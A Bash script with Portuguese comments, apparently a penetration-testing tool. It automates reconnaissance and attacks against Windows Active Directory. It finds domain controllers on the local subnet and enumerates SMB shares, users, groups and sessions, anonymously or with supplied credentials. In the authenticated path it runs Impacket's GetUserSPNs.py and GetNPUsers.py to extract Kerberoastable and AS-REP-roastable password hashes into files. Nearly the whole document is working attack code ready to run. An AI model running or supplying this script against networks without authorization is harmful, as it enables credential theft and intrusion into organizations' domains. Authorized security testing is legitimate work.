#!/bin/bash

###########################
#      AD ENUM SCRIPT     #
#         by Henrique     #
###########################

# --------- CONFIGURAÇÕES ---------
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

# --------- CHECAGEM DE DEPENDÊNCIAS ---------
check_dependencies() {
    echo -e "${GREEN}[+] Verificando dependências...${NC}"
    DEPENDENCIAS=(nmap smbclient rpcclient ldapsearch crackmapexec enum4linux)
    for cmd in "${DEPENDENCIAS[@]}"; do
        if ! command -v "$cmd" &> /dev/null; then
            echo -e "${RED}[-] $cmd não encontrado. Instale antes de continuar.${NC}"
        fi
    done
}

# --------- DESCOBERTA DA SUBNET ---------
get_subnet() {
    SUBNET=$(ip -o -f inet addr show | grep -v 127.0.0.1 | awk '{print $4}' | head -n1)
    if [[ -z "$SUBNET" ]]; then
        echo -e "${RED}[-] Não foi possível determinar a subnet local.${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+] Subnet detectada: $SUBNET${NC}"
}

# --------- DESCOBERTA DE DOMAIN CONTROLLERS ---------
discover_dc() {
    get_subnet
    echo -e "${GREEN}[+] Buscando Domain Controllers na rede...${NC}"

    nmap -p 88,389 --open $SUBNET -oG dc_scan.txt > /dev/null

    DC_IPS=$(grep "Ports: 88/open" dc_scan.txt | awk '{print $2}')

    if [[ -z "$DC_IPS" ]]; then
        echo -e "${RED}[-] Nenhum Domain Controller encontrado.${NC}"
        exit 1
    else
        echo -e "${GREEN}[+] Possíveis Domain Controllers encontrados:${NC}"
        select ip in $DC_IPS; do
            TARGET_IP=$ip
            echo "[+] Usando $TARGET_IP como Domain Controller."
            break
        done
    fi
}

# --------- DETECTAR DOMÍNIO AUTOMATICAMENTE ---------
get_domain() {
    echo "[+] Tentando identificar domínio..."
    DOMAIN_INFO=$(smbclient -L //$TARGET_IP -N 2>/dev/null | grep -i 'Workgroup' | awk '{print $2}')
    if [[ -z "$DOMAIN_INFO" ]]; then
        echo "[-] Não foi possível identificar o domínio."
        DOMAIN="UNKNOWN"
    else
        DOMAIN="$DOMAIN_INFO"
        echo "[+] Domínio identificado: $DOMAIN"
    fi
}

# --------- ENUMERAÇÃO ANÔNIMA ---------
anonymous_enum() {
    echo "[+] Iniciando enumeração anônima..."
    smbclient -L //$TARGET_IP -N > "$OUTPUT_DIR/smb_shares_anon.txt"
    rpcclient -N $TARGET_IP -c enumdomusers > "$OUTPUT_DIR/rpc_users_anon.txt" 2>/dev/null
    enum4linux -a $TARGET_IP > "$OUTPUT_DIR/enum4linux_anon.txt" 2>/dev/null
}

# --------- ENUMERAÇÃO AUTENTICADA ---------
auth_enum() {
    echo "[+] Iniciando enumeração autenticada..."
    ldapsearch -x -H ldap://$TARGET_IP -b "dc=${DOMAIN//./,dc=}" > "$OUTPUT_DIR/ldapsearch.txt" 2>/dev/null
    rpcclient -U "$USERNAME%$PASSWORD" $TARGET_IP -c enumdomusers > "$OUTPUT_DIR/rpc_users.txt" 2>/dev/null
    smbclient -L //$TARGET_IP -U "$USERNAME%$PASSWORD" > "$OUTPUT_DIR/smb_shares.txt" 2>/dev/null

    grep 'Disk' "$OUTPUT_DIR/smb_shares.txt" | awk '{print $1}' | while read share; do
        echo "[*] Acessando $share..."
        smbclient //$TARGET_IP/$share -U "$USERNAME%$PASSWORD" -c 'ls' > "$OUTPUT_DIR/share_${share}.txt" 2>/dev/null
    done

    crackmapexec smb $TARGET_IP -u $USERNAME -p $PASSWORD --shares --users --groups --sessions --disks > "$OUTPUT_DIR/cme.txt" 2>/dev/null
}

# --------- ATAQUES AVANÇADOS COM IMPACKET ---------
advanced_attacks() {
    if command -v GetUserSPNs.py &> /dev/null; then
        echo "[+] Verificando SPNs para Kerberoasting..."
        GetUserSPNs.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $TARGET_IP -outputfile "$OUTPUT_DIR/spns.txt"
    fi

    if command -v GetNPUsers.py &> /dev/null; then
        echo "[+] Buscando usuários vulneráveis a AS-REP Roasting..."
        GetNPUsers.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $TARGET_IP -no-pass > "$OUTPUT_DIR/asrep.txt"
    fi
}

# --------- INÍCIO DO SCRIPT ---------
check_dependencies

discover_dc
get_domain

echo ""
read -p "[?] Deseja utilizar autenticação? (s/n): " AUTH_CHOICE

if [[ "$AUTH_CHOICE" == "s" || "$AUTH_CHOICE" == "S" ]]; then
    read -p "Informe o usuário: " USERNAME
    read -p "Informe a senha: " PASSWORD
fi

OUTPUT_DIR="AD_ENUM_$TARGET_IP"
mkdir -p "$OUTPUT_DIR"

echo "[+] Escaneando portas adicionais..."
nmap -p 53,88,135,139,389,445,636,3268,3269 --open -Pn $TARGET_IP -oN "$OUTPUT_DIR/ports.txt"

if [[ -z "$USERNAME" || -z "$PASSWORD" ]]; then
    anonymous_enum
else
    auth_enum
    advanced_attacks
fi

echo ""
echo "[+] Enumeração concluída. Resultados salvos em $OUTPUT_DIR/"
